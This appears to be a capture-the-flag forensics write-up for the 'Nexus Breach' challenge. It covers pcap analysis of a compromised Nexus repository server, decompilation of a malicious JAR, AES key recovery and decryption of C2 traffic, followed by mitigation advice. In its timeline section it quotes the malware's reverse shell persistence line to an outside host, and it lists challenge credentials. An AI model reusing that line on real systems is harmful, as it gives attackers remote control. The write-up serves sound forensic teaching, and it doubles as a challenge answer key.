# HTB Operation Blackout - The Nexus Breach

## Challenge Overview

**Challenge Name:** The Nexus Breach  
**Category:** Forensics / Network Analysis  
**Difficulty:** Medium  
**Flag:** Various (Multi-question challenge)

This challenge involves analyzing a compromised Nexus Repository Manager server through network forensics. The investigation spans HTTP traffic analysis, malware reverse engineering, and encrypted TCP stream decryption.

## Given Files

- `capture.pcapng` - Network capture file containing the entire attack

## Technical Analysis

### Challenge Structure
- **Q1-Q4:** HTTP stream analysis (tcp.stream eq 0)
- **Q5-Q10:** Malware analysis and TCP stream decryption (tcp.stream eq 1)

### Network Traffic Composition
- **Stream 0:** HTTP communication to Nexus Repository Manager
- **Stream 1:** Encrypted TCP communication with malware C2

## Attack Chain

### Phase 1: Initial Compromise Analysis (HTTP Stream)

#### 1. HTTP Object Extraction
```bash
# In Wireshark: File → Export Objects → HTTP → Save All
# Extracts all HTTP artifacts including:
# - PhoenixCyberToolkit-1.0.jar (malicious JAR)
# - Various login files and server responses
```

#### 2. Admin Credential Discovery
**Filter:** `tcp.stream eq 0`
```
# Analyze HTTP requests to /login endpoints
# Look for 200 OK responses indicating successful authentication
# Basic Credentials tab shows: admin:dL4zyVJ1y8UhT1hX1m
```

#### 3. Nexus Version Identification
```bash
# Search through exported HTTP objects for "OSS"
# Identifies: Nexus Repository Manager OSS 2.15.1-02
```

#### 4. Persistent User Account Creation
```bash
# HTTP requests to user management endpoints reveal:
# Username: adm1n1str4t0r (leet speak)
# Password: 46vaGuj566
```

#### 5. Java Package Deployment
```bash
# HTTP PUT requests show package deployment:
# File path: com/phoenix/toolkit → Package: com.phoenix.toolkit
```

### Phase 2: Malware Analysis

#### 1. JAR File Extraction and Analysis
```bash
mkdir extracted_jar
cd extracted_jar
unzip ../PhoenixCyberToolkit-1.0.jar

# Reveals: com/phoenix/toolkit/App.class
```

#### 2. Java Bytecode Decompilation
```bash
javap -c -p com/phoenix/toolkit/App.class > App_decompiled.txt
```

**Key Findings:**
- Connects to `10.10.10.23:4444`
- Uses `mNoPq5()` method for key generation
- Uses `uJtXq5()` method for AES decryption

#### 3. AES Key Recovery
```python
import base64

def fGhJk6_decode(b64_text, xor_key):
    """Reverse of: Base64.encode(original XOR key)"""
    decoded_bytes = base64.b64decode(b64_text)
    return ''.join(chr(b ^ xor_key) for b in decoded_bytes)

def gDF5a_transform(input_str):
    """Apply the character transformation"""
    result = ''
    for c in input_str:
        transformed = ((ord(c) ^ 7) + 33) % 94 + 33
        result += chr(transformed)
    return result

# Original strings and XOR keys from bytecode
strings = ['3t9834', 's3cr', '354r', '34']
keys = [55, 77, 23, 42]

# Step 1: Encode like the malware does
encoded_parts = []
for orig, key in zip(strings, keys):
    encoded = static_block_encode(orig, key)
    encoded_parts.append(encoded)

# Step 2: Decode using fGhJk6
decoded_parts = []
for encoded, key in zip(encoded_parts, keys):
    decoded = fGhJk6_decode(encoded, key)
    decoded_parts.append(decoded)

# Step 3: Apply reordering [3,2,1,0]
order = [3, 2, 1, 0]
concatenated = ''.join(decoded_parts[i] for i in order)
print(f"Concatenated: {concatenated}")  # "34354rs3cr3t9834"

# Step 4: Apply gDF5a transformation
final_key = gDF5a_transform(concatenated)
print(f"Final AES Key: {final_key}")  # vuvtuYXvHYvW"#vu
```

### Phase 3: Encrypted Communication Analysis

#### 1. TCP Stream Extraction
```bash
# In Wireshark: Filter tcp.stream eq 1
# Follow TCP Stream → Save as TCPDUMP.txt
```

#### 2. AES Decryption Implementation
```python
#!/usr/bin/env python3

import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import re

def decrypt_aes(encrypted_data, key):
    """Decrypt AES encrypted data"""
    try:
        # Decode base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # Extract IV (first 16 bytes) and ciphertext
        iv = encrypted_bytes[:16]
        ciphertext = encrypted_bytes[16:]
        
        # Create cipher and decrypt
        cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove padding
        decrypted = unpad(decrypted, AES.block_size)
        
        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        # Try without IV (ECB mode)
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
            decrypted = cipher.decrypt(encrypted_bytes)
            decrypted = unpad(decrypted, AES.block_size)
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return f"DECRYPT_FAILED: {str(e)}"

# Process TCPDUMP.txt with AES key: vuvtuYXvHYvW"#vu
```

#### 3. Attack Timeline Reconstruction
**Decrypted Communication Reveals:**
1. **Initial Command:** `uname -a` (system reconnaissance)
2. **System Response:** `Linux phoenix-repo 5.15.0-134-generic...`
3. **File System Reconnaissance:** Multiple find/grep commands
4. **Configuration Extraction:** 
   - User account: `john_smith` from security.xml
   - SMTP credentials from nexus.xml
5. **Persistence Establishment:** 
   - Creates: `/sonatype-work/storage/.phoenix-updater`
   - Contains: `bash -i >& /dev/tcp/10.10.10.23/4444 0>&1`

## Key Technical Concepts

### Network Forensics
- TCP stream filtering enables isolation of specific communication channels
- HTTP object extraction provides access to transferred files
- Base64 encoding commonly used in malware communication

### Java Malware Analysis
- JAR files contain compiled Java bytecode that can be decompiled
- Static blocks execute during class loading for steganographic data
- Method names often obfuscated but functionality remains analyzable

### Encryption Analysis
- AES with CBC mode requires IV extraction for proper decryption
- Multi-layer obfuscation (XOR, Base64, character transformation)
- Key generation algorithms can be reverse-engineered from bytecode

## Mitigation Recommendations

### Network Security
- Implement deep packet inspection for encrypted communication patterns
- Monitor for unusual outbound connections from repository servers
- Use network segmentation to isolate critical infrastructure

### Application Security
- Regularly update Nexus Repository Manager to latest versions
- Implement JAR file scanning before deployment
- Use application whitelisting to prevent unauthorized code execution

### Monitoring and Detection
- Deploy SIEM rules for repository server authentication anomalies
- Monitor for creation of hidden files in application directories
- Implement behavioral analysis for unusual system commands

## Tools Used

- Wireshark for network traffic analysis and stream extraction
- javap for Java bytecode decompilation  
- Python with pycryptodome for AES decryption
- Base64 command-line utilities for decoding

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)